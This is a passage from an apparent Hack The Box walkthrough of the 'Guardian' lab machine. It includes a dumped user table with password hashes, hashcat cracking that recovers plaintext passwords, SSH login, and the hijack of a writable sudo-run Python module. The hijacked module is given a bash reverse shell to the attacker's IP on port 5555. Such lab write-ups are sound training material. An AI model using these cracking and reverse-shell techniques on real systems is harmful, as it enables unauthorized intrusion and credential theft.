|      11 | mireielle.feek     | 18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3 | Mireielle Feek       | mireielle.feek@guardian.htb     | 2001-08-01 | 13452 Fussell Way, Raleigh, North Carolina, United States, 27690              | lecturer  | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      12 | vivie.smallthwaite | b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a | Vivie Smallthwaite   | vivie.smallthwaite@guardian.htb | 1993-04-02 | 8653 Hemstead Road, Houston, Texas, United States, 77293                      | lecturer  | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      13 | GU0142023          | 5381d07c15c0f0107471d25a30f5a10c4fd507abe322853c178ff9c66e916829 | Boone Basden         | GU0142023@guardian.htb          | 2001-09-12 | 10523 Panchos Way, Columbus, Ohio, United States, 43284                       | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      14 | GU6262023          | 87847475fa77edfcf2c9e0973a91c9b48ba850e46a940828dfeba0754586938f | Jamesy Currin        | GU6262023@guardian.htb          | 2001-11-28 | 13972 Bragg Avenue, Dulles, Virginia, United States, 20189                    | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      15 | GU0702025          | 48b16b7f456afa78ba00b2b64b4367ded7d4e3daebf08b13ff71a1e0a3103bb1 | Stephenie Vernau     | GU0702025@guardian.htb          | 1996-04-16 | 14649 Delgado Avenue, Tacoma, Washington, United States, 98481                | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      16 | GU0762023          | e7ff40179d9a905bc8916e020ad97596548c0f2246bfb7df9921cc8cdaa20ac2 | Milly Saladine       | GU0762023@guardian.htb          | 1995-11-19 | 2031 Black Stone Place, San Francisco, California, United States, 94132       | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      17 | GU9492024          | 8ae72472bd2d81f774674780aef36fc20a0234e62cdd4889f7b5a6571025b8d1 | Maggy Clout          | GU9492024@guardian.htb          | 2000-05-30 | 8322 Richland Road, Billings, Montana, United States, 59112                   | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      18 | GU9612024          | cf54d11e432e53262f32e799c6f02ca2130ae3cff5f595d278d071ecf4aeaf57 | Shawnee Bazire       | GU9612024@guardian.htb          | 2002-05-27 | 4364 Guadalupe Court, Pensacola, Florida, United States, 32520                | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      19 | GU7382024          | 7852ec8fcfded3f1f6b343ec98adde729952b630bef470a75d4e3e0da7ceea1a | Jobey Dearle-Palser  | GU7382024@guardian.htb          | 1998-04-14 | 4620 De Hoyos Place, Tampa, Florida, United States, 33625                     | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      20 | GU6632023          | 98687fb5e0d6c9004c09dadbe85b69133fd24d5232ff0a3cf3f768504e547714 | Erika Sandilands     | GU6632023@guardian.htb          | 1994-06-08 | 1838 Herlong Court, San Bernardino, California, United States, 92410          | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      21 | GU1922024          | bf5137eb097e9829f5cd41f58fc19ed472381d02f8f635b2e57a248664dd35cd | Alisander Turpie     | GU1922024@guardian.htb          | 1998-08-07 | 813 Brody Court, Bakersfield, California, United States, 93305                | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      22 | GU8032023          | 41b217df7ff88d48dac1884a8c539475eb7e7316f33d1ca5a573291cfb9a2ada | Wandie McRobbie      | GU8032023@guardian.htb          | 2002-01-16 | 5732 Eastfield Path, Peoria, Illinois, United States, 61629                   | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      23 | GU5852023          | e02610ca77a91086c85f93da430fd2f67f796aab177c88d789720ca9b724492a | Erinn Franklyn       | GU5852023@guardian.htb          | 2003-05-01 | 50 Lindsey Lane Court, Fairbanks, Alaska, United States, 99790                | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      24 | GU0712023          | e6aad48962fd44e506ac16d81b5e4587cad2fd2dc51aabbf193f4fd29d036a7a | Niel Slewcock        | GU0712023@guardian.htb          | 1996-05-04 | 3784 East Schwartz Boulevard, Gainesville, Florida, United States, 32610      | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      25 | GU1592025          | 1710aed05bca122521c02bff141c259a81a435f900620306f92b840d4ba79c71 | Chryste Lamputt      | GU1592025@guardian.htb          | 1993-05-22 | 6620 Anhinga Lane, Baton Rouge, Louisiana, United States, 70820               | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      26 | GU1112023          | 168ae18404da4fff097f9218292ae8f93d6c3ac532e609b07a1c1437f2916a7d | Kiersten Rampley     | GU1112023@guardian.htb          | 1997-06-28 | 9990 Brookdale Court, New York City, New York, United States, 10292           | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      27 | GU6432025          | a28e58fd78fa52c651bfee842b1d3d8f5873ae00a4af56a155732a4a6be41bc6 | Gradeigh Espada      | GU6432025@guardian.htb          | 1999-06-06 | 5464 Lape Lane, Boise, Idaho, United States, 83757                            | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      28 | GU3042024          | d72fc47472a863fafea2010efe6cd4e70976118babaa762fef8b68a35814e9ab | Susanne Myhill       | GU3042024@guardian.htb          | 2003-04-12 | 11585 Homan Loop, Aiken, South Carolina, United States, 29805                 | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      29 | GU1482025          | be0145f24b8f6943fd949b7ecaee55bb9d085eb3e81746826374c52e1060785f | Prudi Sweatman       | GU1482025@guardian.htb          | 1998-05-10 | 1533 Woodmill Terrace, Palo Alto, California, United States, 94302            | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      30 | GU3102024          | 3aa2232d08262fca8db495c84bd45d8c560e634d5dff8566f535108cf1cc0706 | Kacey Qualtrough     | GU3102024@guardian.htb          | 1996-03-09 | 14579 Ayala Way, Spokane, Washington, United States, 99252                    | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      31 | GU7232023          | 4813362e8d6194abfb20154ba3241ade8806445866bce738d24888aa1aa9bea6 | Thedrick Grimstead   | GU7232023@guardian.htb          | 1998-05-20 | 13789 Castlegate Court, Salt Lake City, Utah, United States, 84130            | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      32 | GU8912024          | 6c249ab358f6adfc67aecb4569dae96d8a57e3a64c82808f7cede41f9a330c51 | Dominik Clipsham     | GU8912024@guardian.htb          | 1999-06-30 | 7955 Lock Street, Kansas City, Missouri, United States, 64160                 | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      33 | GU4752025          | 4d7625ec0d45aa83ef374054c8946497a798ca6a3474f76338f0ffe829fced1a | Iain Vinson          | GU4752025@guardian.htb          | 1990-10-13 | 10384 Zeeland Terrace, Cleveland, Ohio, United States, 44105                  | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      34 | GU9602024          | 6eeb4b329b7b7f885df9757df3a67247df0a7f14b539f01d3cb988e4989c75e2 | Ax Sweating          | GU9602024@guardian.htb          | 1994-06-22 | 4518 Vision Court, Sarasota, Florida, United States, 34233                    | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      35 | GU4382025          | 8d57c0124615f5c82cabfdd09811251e7b2d70dcf2d3a3b3942a31c294097ec8 | Trixi Piolli         | GU4382025@guardian.htb          | 2001-02-02 | 11634 Reid Road, Charleston, South Carolina, United States, 29424             | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      36 | GU7352023          | 8c9a8f4a6daceecb6fff0eae3830d16fe7e05a98101cb21f1b06d592a33cb005 | Ronni Fulton         | GU7352023@guardian.htb          | 1998-11-07 | 4690 Currituck Terrace, Vero Beach, Florida, United States, 32964             | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      37 | GU3042025          | 1d87078236f9da236a92f42771749dad4eea081a08a5da2ed3fa5a11d85fa22f | William Lidstone     | GU3042025@guardian.htb          | 1998-03-18 | 11566 Summerchase Loop, Providence, Rhode Island, United States, 02905        | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      38 | GU3872024          | 12a2fe5b87191fedadc7d81dee2d483ab2508650d96966000f8e1412ca9cd74a | Viola Bridywater     | GU3872024@guardian.htb          | 2003-07-21 | 9436 Erica Chambers Avenue, Bronx, New York, United States, 10454             | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      39 | GU7462025          | 5e95bfd3675d0d995027c392e6131bf99cf2cfba73e08638fa1c48699cdb9dfa | Glennie Crilly       | GU7462025@guardian.htb          | 1995-01-26 | 3423 Carla Fink Court, Washington, District of Columbia, United States, 20580 | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      40 | GU3902023          | 6b4502ad77cf9403e9ac3338ff7da1c08688ef2005dae839c1cd6e07e1f6409b | Ninnette Lenchenko   | GU3902023@guardian.htb          | 1994-11-06 | 12277 Richey Road, Austin, Texas, United States, 78754                        | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      41 | GU1832025          | 6ab453e985e31ef54419376be906f26fff02334ec5f26a681d90c32aec6d311f | Rivalee Coche        | GU1832025@guardian.htb          | 1990-10-23 | 2999 Indigo Avenue, Washington, District of Columbia, United States, 20022    | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      42 | GU3052024          | 1cde419d7f3145bcfcbf9a34f80452adf979f71496290cf850944d527cda733f | Lodovico Atlay       | GU3052024@guardian.htb          | 1992-04-16 | 5803 Clarendon Court, Little Rock, Arkansas, United States, 72231             | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      43 | GU3612023          | 7ba8a71e39c1697e0bfa66052285157d2984978404816c93c2a3ddaba6455e3a | Maris Whyborne       | GU3612023@guardian.htb          | 1999-08-07 | 435 Quaint Court, Staten Island, New York, United States, 10305               | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      44 | GU7022023          | 7a02cc632b8cb1a6f036cb2c963c084ffea9184a92259d932e224932fdad81a8 | Diahann Forber       | GU7022023@guardian.htb          | 1998-12-17 | 10094 Ely Circle, New Haven, Connecticut, United States, 06533                | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      45 | GU1712025          | ebfa2119ebe2aaed2c329e25ce2e5ed8efa2d78e72c273bb91ff968d02ee5225 | Sinclair Tierney     | GU1712025@guardian.htb          | 1999-11-04 | 2885 Columbia Way, Seattle, Washington, United States, 98127                  | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      46 | GU9362023          | 8b7ce469fb40e88472c9006cb1d65ffa20b2f9c41e983d49ca0cdf642d8f1592 | Leela Headon         | GU9362023@guardian.htb          | 1992-10-24 | 14477 Donelin Circle, El Paso, Texas, United States, 88589                    | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      47 | GU5092024          | 11ae26f27612b1adca57f14c379a8cc6b4fc5bdfcfd21bef7a8b0172b7ab4380 | Egon Jaques          | GU5092024@guardian.htb          | 1995-04-19 | 12886 Chimborazo Way, Fort Lauderdale, Florida, United States, 33315          | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      48 | GU5252023          | 70a03bb2060c5e14b33c393970e655f04d11f02d71f6f44715f6fe37784c64fa | Meade Newborn        | GU5252023@guardian.htb          | 2003-09-02 | 3679 Inman Mills Road, Orlando, Florida, United States, 32859                 | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      49 | GU8802025          | 7ae4ac47f05407862cb2fcd9372c73641c822bbc7fc07ed9d16e6b63c2001d76 | Tadeo Sproson        | GU8802025@guardian.htb          | 2002-08-01 | 4293 Tim Terrace, Springfield, Illinois, United States, 62776                 | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      50 | GU2222023          | d3a175c6e9da02ae83ef1f2dd1f59e59b8a63e5895b81354f7547714216bbdcd | Delia Theriot        | GU2222023@guardian.htb          | 2001-07-15 | 5847 Beechwood Avenue, Chattanooga, Tennessee, United States, 37450           | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      51 | GU9802023          | a03da309de0a60f762ce31d0bde5b9c25eb59e740719fc411226a24e72831f5c | Ransell Dourin       | GU9802023@guardian.htb          | 1995-01-04 | 1809 Weaton Court, Chattanooga, Tennessee, United States, 37410               | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      52 | GU3122025          | e96399fcdb8749496abc6d53592b732b1b2acb296679317cf59f104a5f51343a | Franklyn Kuhndel     | GU3122025@guardian.htb          | 1991-06-05 | 11809 Mccook Street, Shawnee Mission, Kansas, United States, 66210            | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      53 | GU2062025          | 0ece0b43e6019e297e0bce9f07f200ff03d629edbed88d4f12f2bad27e7f4df8 | Petronille Scroggins | GU2062025@guardian.htb          | 2001-06-16 | 11794 Byron Place, Des Moines, Iowa, United States, 50981                     | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      54 | GU3992025          | b86518d246a22f4f5938444aa18f2893c4cccabbe90ca48a16be42317aec96a0 | Kittie Maplesden     | GU3992025@guardian.htb          | 2001-10-04 | 6212 Matisse Avenue, Palatine, Illinois, United States, 60078                 | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      55 | GU1662024          | 5c28cd405a6c0543936c9d010b7471436a7a33fa64f5eb3e84ab9f7acc9a16e5 | Gherardo Godon       | GU1662024@guardian.htb          | 2002-04-17 | 9997 De Hoyos Place, Simi Valley, California, United States, 93094            | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      56 | GU9972025          | 339d519ef0c55e63ebf4a8fde6fda4bca4315b317a1de896fb481bd0834cc599 | Kippar Surpliss      | GU9972025@guardian.htb          | 1990-08-10 | 5372 Gentle Terrace, San Francisco, California, United States, 94110          | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      57 | GU6822025          | 298560c0edce3451fd36b69a15792cbb637c8366f058cf674a6964ff34306482 | Sigvard Reubens      | GU6822025@guardian.htb          | 2003-04-23 | 5711 Magana Place, Memphis, Tennessee, United States, 38104                   | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      58 | GU7912023          | 8236b81b5f67c798dd5943bca91817558e987f825b6aae72a592c8f1eaeee021 | Carly Buckler        | GU7912023@guardian.htb          | 1991-09-07 | 2298 Hood Place, Springfield, Massachusetts, United States, 01105             | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      59 | GU3622024          | 1c92182d9a59d77ea20c0949696711d8458c870126cf21330f61c2cba6ae6bcf | Maryjo Gration       | GU3622024@guardian.htb          | 1997-04-25 | 1998 Junction Place, Irvine, California, United States, 92619                 | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      60 | GU2002023          | 3c378b73442c2cf911f2a157fc9e26ecde2230313b46876dab12a661169ed6e2 | Paulina Mainwaring   | GU2002023@guardian.htb          | 1993-05-04 | 11891 Markridge Loop, Olympia, Washington, United States, 98506               | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      61 | GU3052023          | 2ef01f607f86387d0c94fc2a3502cc3e6d8715d3b1f124b338623b41aed40cf8 | Curran Foynes        | GU3052023@guardian.htb          | 2000-12-04 | 7021 Cordelia Place, Paterson, New Jersey, United States, 07505               | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      62 | GU1462023          | 585aacf74b22a543022416ed771dca611bd78939908c8323f4f5efef5b4e0202 | Cissy Styan          | GU1462023@guardian.htb          | 1991-01-10 | 1138 Salinas Avenue, Orlando, Florida, United States, 32854                   | student   | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      63 | 2fa0n              | 62b5970b07c98045940adb7c9d343253f653f62804b833b61cd2c28c4c31e2a9 | 2fa0nhtb             | 2fa0n@guardian.htb              | 2025-09-01 | Admin Address                                                                 | admin     | active | 2025-09-01 13:12:55 | 2025-09-01 13:12:55 |
+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
63 rows in set (0.00 sec)
```

We are interesting in user with admin role, there are 3 so we gonna save those hash and crack it.

### Password Cracking
From the `config.php` we saw this one use `salt` which is `8Sb)tM1vs1SS` and also from `createuser.php` in `/admin` that we gonna see the format.

![Guardian Admin CreateUser Source Code](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_admin-createuser-source-code.png)

So the format is `sha256(password + salt)`. <br>
&rarr; Checking `hashcat` to see which mode we gonna use.

```bash
└─$ hashcat -h | grep -i SHA256                                              
   1470 | sha256(utf16le($pass))                                     | Raw Hash
   1410 | sha256($pass.$salt)                                        | Raw Hash salted and/or iterated
   1420 | sha256($salt.$pass)                                        | Raw Hash salted and/or iterated
  22300 | sha256($salt.$pass.$salt)                                  | Raw Hash salted and/or iterated
  20720 | sha256($salt.sha256($pass))                                | Raw Hash salted and/or iterated
  21420 | sha256($salt.sha256_bin($pass))                            | Raw Hash salted and/or iterated
   1440 | sha256($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
  20800 | sha256(md5($pass))                                         | Raw Hash salted and/or iterated
  20710 | sha256(sha256($pass).$salt)                                | Raw Hash salted and/or iterated
  21400 | sha256(sha256_bin($pass))                                  | Raw Hash salted and/or iterated
   1430 | sha256(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
   1450 | HMAC-SHA256 (key = $pass)                                  | Raw Hash authenticated
   1460 | HMAC-SHA256 (key = $salt)                                  | Raw Hash authenticated
  28700 | Amazon AWS4-HMAC-SHA256                                    | Raw Hash authenticated
  10900 | PBKDF2-HMAC-SHA256                                         | Generic KDF
  26800 | SNMPv3 HMAC-SHA256-192                                     | Network Protocol
   6400 | AIX {ssha256}                                              | Operating System
  19100 | QNX /etc/shadow (SHA256)                                   | Operating System
  12800 | MS-AzureSync PBKDF2-HMAC-SHA256                            | Operating System
   9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                              | Operating System
   5700 | Cisco-IOS type 4 (SHA256)                                  | Operating System
   7400 | sha256crypt $5$, SHA256 (Unix)                             | Operating System
   7401 | MySQL $A$ (sha256crypt)                                    | Database Server
   1411 | SSHA-256(Base64), LDAP {SSHA256}                           | FTP, HTTP, SMTP, LDAP Server
  10901 | RedHat 389-DS LDAP (PBKDF2-HMAC-SHA256)                    | FTP, HTTP, SMTP, LDAP Server
  20600 | Oracle Transportation Management (SHA256)                  | Enterprise Application Software (EAS)
  20711 | AuthMe sha256                                              | Enterprise Application Software (EAS)
  22400 | AES Crypt (SHA256)                                         | Full-Disk Encryption (FDE)
  13751 | VeraCrypt SHA256 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
  13752 | VeraCrypt SHA256 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
  13753 | VeraCrypt SHA256 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
  13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode (legacy)        | Full-Disk Encryption (FDE)
  13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
  13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
  29451 | VeraCrypt SHA256 + XTS 512 bit                             | Full-Disk Encryption (FDE)
  29452 | VeraCrypt SHA256 + XTS 1024 bit                            | Full-Disk Encryption (FDE)
  29453 | VeraCrypt SHA256 + XTS 1536 bit                            | Full-Disk Encryption (FDE)
  29461 | VeraCrypt SHA256 + XTS 512 bit + boot-mode                 | Full-Disk Encryption (FDE)
  29462 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode                | Full-Disk Encryption (FDE)
  29463 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode                | Full-Disk Encryption (FDE)
  27500 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-128-XTS)              | Full-Disk Encryption (FDE)
  27600 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-256-XTS)              | Full-Disk Encryption (FDE)
  10000 | Django (PBKDF2-SHA256)                                     | Framework
  30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt))         | Framework
  20300 | Python passlib pbkdf2-sha256                               | Framework
  24420 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA256 + 3DES/AES)        | Private Key
  22301 | Telegram Mobile App Passcode (SHA256)                      | Instant Messaging Service
  18800 | Blockchain, My Wallet, Second Password (SHA256)            | Cryptocurrency Wallet
  16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256               | Cryptocurrency Wallet
  15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256                        | Cryptocurrency Wallet
```

So the mode `1410` is suitable for our case.

```bash
└─$ cat hashes.txt    
admin:694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS
jamil.enockson:c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS
mark.pargetter:8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e:8Sb)tM1vs1SS
```

To make the crackable work, we need to add the hashcat with following format. <br>
&rarr; Now let's crack it and see the result.

```bash
└─$ hashcat -m 1410 hashes.txt -w 3 -O /usr/share/wordlists/rockyou.txt --username
```

```bash
└─$ hashcat -m 1410 hashes.txt -w 3 -O /usr/share/wordlists/rockyou.txt --username --show
admin:694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS:fakebake000
jamil.enockson:c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhouse56
```

We got password from `admin` and `jamil.enockson`. <br>
&rarr; The password for admin seems so sus so we gonna use `jamil.enockson` to ssh.

```bash
└─$ ssh jamil@10.129.101.248         
jamil@10.129.101.248's password: 
jamil@guardian:~$ ls -la
total 28
drwxr-x--- 3 jamil jamil 4096 Jul 14 16:57 .
drwxr-xr-x 6 root  root  4096 Jul 30 14:59 ..
lrwxrwxrwx 1 root  root     9 Jul 14 16:57 .bash_history -> /dev/null
-rw-r--r-- 1 jamil jamil  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 jamil jamil 3805 Apr 19 07:52 .bashrc
drwx------ 2 jamil jamil 4096 Apr 26 17:27 .cache
lrwxrwxrwx 1 root  root     9 Apr 12 10:15 .mysql_history -> /dev/null
-rw-r--r-- 1 jamil jamil  807 Jan  6  2022 .profile
-rw-r----- 1 root  jamil   33 Sep  1 09:58 user.txt
jamil@guardian:~$ cat user.txt
71eb00a45adafa3f8974c364e7ba2f5c
```

Nailed the `user.txt` flag.

## Initial Access
After we are in `jamil`, let's do some recon and discovery.

### Discovery (jamil)
```bash
jamil@guardian:~$ id
uid=1000(jamil) gid=1000(jamil) groups=1000(jamil),1002(admins)
```

So `jamil` also in `admins` group.

```bash
jamil@guardian:~$ sudo -l
Matching Defaults entries for jamil on guardian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jamil may run the following commands on guardian:
    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py
```

`jamil` can run the commands with `mark` privileges. <br>
&rarr; So our next escalated target is `mark`.

Now we gonna check out this one `/opt/scripts/utilities/utilities.py`

```py
# utilities.py 
#!/usr/bin/env python3

import argparse
import getpass
import sys

from utils import db
from utils import attachments
from utils import logs
from utils import status


def main():
    parser = argparse.ArgumentParser(description="University Server Utilities Toolkit")
    parser.add_argument("action", choices=[
        "backup-db",
        "zip-attachments",
        "collect-logs",
        "system-status"
    ], help="Action to perform")
    
    args = parser.parse_args()
    user = getpass.getuser()

    if args.action == "backup-db":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        db.backup_database()
    elif args.action == "zip-attachments":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        attachments.zip_attachments()
    elif args.action == "collect-logs":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        logs.collect_logs()
    elif args.action == "system-status":
        status.system_status()
    else:
        print("Unknown action.")

if __name__ == "__main__":
    main()
```

```bash
jamil@guardian:/opt/scripts/utilities$ ls -la
total 20
drwxr-sr-x 4 root admins 4096 Jul 10 13:53 .
drwxr-xr-x 3 root root   4096 Jul 12 15:10 ..
drwxrws--- 2 mark admins 4096Jul 10 13:53 output
-rwxr-x--- 1 root admins 1136 Apr 20 14:45 utilities.py
drwxrwsr-x 2 root root   4096 Jul 10 14:20 utils
```

Checking the file permissions and we saw that only `mark` can run other functions, but `system-status` can run by anyone. <br>
&rarr; Let's check out `/opt/scripts/utilities/utils`.

```bash
jamil@guardian:/opt/scripts/utilities/utils$ ls -la
total 24
drwxrwsr-x 2 root root   4096 Jul 10 14:20 .
drwxr-sr-x 4 root admins 4096 Jul 10 13:53 ..
-rw-r----- 1 root admins  287 Apr 19 08:15 attachments.py
-rw-r----- 1 root admins  246 Jul 10 14:20 db.py
-rw-r----- 1 root admins  226 Apr 19 08:16 logs.py
-rwxrwx--- 1 mark admins  253 Apr 26 09:45 status.py
```

We can see that file `status.py` was written by `mark` and `admins` group. <br>
The key things is that our user `jamil` is also in `admins` group and got write permission so we can modified this file. <br>
Then run the `utilities.py` via `mark` so it will check the `system-status` but the code we saw does not check that user must be `mark`. <br>
&rarr; From this point, we can hijack `status.py` to get `mark` shell.

### Hijacking
Now we need to backup the `status.py` original file first.

```bash
jamil@guardian:/opt/scripts/utilities$ cp /opt/scripts/utilities/utils/status.py /tmp/status.py.bak
jamil@guardian:/opt/scripts/utilities$ ls -la /tmp
total 88
drwxrwxrwt 21 root  root  4096 Sep  1 13:51 .
drwxr-xr-x 20 root  root  4096 Jul 14 16:57 ..
drwx------  2 sammy sammy 4096 Sep  1 10:08 .com.google.Chrome.EBfhkm
drwx------  2 sammy sammy 4096 Sep  1 13:11 .com.google.Chrome.eNA1yx
drwx------  2 sammy sammy 4096 Sep  1 10:07 .com.google.Chrome.jLXljX
drwx------  2 sammy sammy 4096 Sep  1 13:12 .com.google.Chrome.PR2ygr
drwx------  2 sammy sammy 4096 Sep  1 10:06 .com.google.Chrome.sG8Lf7
drwx------  2 sammy sammy 4096 Sep  1 13:12 .com.google.Chrome.z37ZHu
drwxrwxrwt  2 root  root  4096 Sep  1 09:58 .font-unix
drwxrwxrwt  2 root  root  4096 Sep  1 09:58 .ICE-unix
drwx------  2 root  root  4096 Sep  1 09:58 snap-private-tmp
-rwxrwx---  1 jamil jamil  253 Sep  1 13:51 status.py.bak
drwx------  3 root  root  4096 Sep  1 09:58 systemd-private-afb7d4c75902458490aef73c1e073f53-apache2.service-19SZHC
drwx------  3 root  root  4096 Sep  1 09:58 systemd-private-afb7d4c75902458490aef73c1e073f53-ModemManager.service-Tx9LrD
drwx------  3 root  root  4096 Sep  1 09:58 systemd-private-afb7d4c75902458490aef73c1e073f53-systemd-logind.service-Wgt8zs
drwx------  3 root  root  4096 Sep  1 09:58 systemd-private-afb7d4c75902458490aef73c1e073f53-systemd-resolved.service-RGxk6n
drwx------  3 root  root  4096 Sep  1 09:58 systemd-private-afb7d4c75902458490aef73c1e073f53-systemd-timesyncd.service-rQUeyo
drwx------  3 root  root  4096 Sep  1 10:06 systemd-private-afb7d4c75902458490aef73c1e073f53-upower.service-O6Fvmx
drwxrwxrwt  2 root  root  4096 Sep  1 09:58 .Test-unix
drwx------  2 root  root  4096 Sep  1 09:58 vmware-root_639-3988031840
drwxrwxrwt  2 root  root  4096 Sep  1 09:58 .X11-unix
drwxrwxrwt  2 root  root  4096 Sep  1 09:58 .XIM-unix
```

Then we gonna modified the `status.py` to our malicious execution.

```py
# status.py 
import platform
import psutil
import os
import subprocess

def system_status():
    print("System:", platform.system(), platform.release())
    print("CPU usage:", psutil.cpu_percent(), "%")
    print("Memory usage:", psutil.virtual_memory().percent, "%")
    subprocess.run(["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.16.36/5555 0>&1"])
```

Setup our kali listener.

```bash
└─$ penelope -p 5555                                               
[+] Listening for reverse shells on 0.0.0.0:5555 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.36
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Now let's run the `utilities.py` via `mark`.

```bash
jamil@guardian:/opt/scripts/utilities/utils$ sudo -u mark /opt/scripts/utilities/utilities.py system-status
System: Linux 5.15.0-152-generic
CPU usage: 0.0 %
Memory usage: 31.8 %
```

> *To know the option to use, run this command `/opt/scripts/utilities/utilities.py -h`.*

Wait for a few second.

```bash
└─$ penelope -p 5555                                               
[+] Listening for reverse shells on 0.0.0.0:5555 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.36
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from guardian~10.129.101.248-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
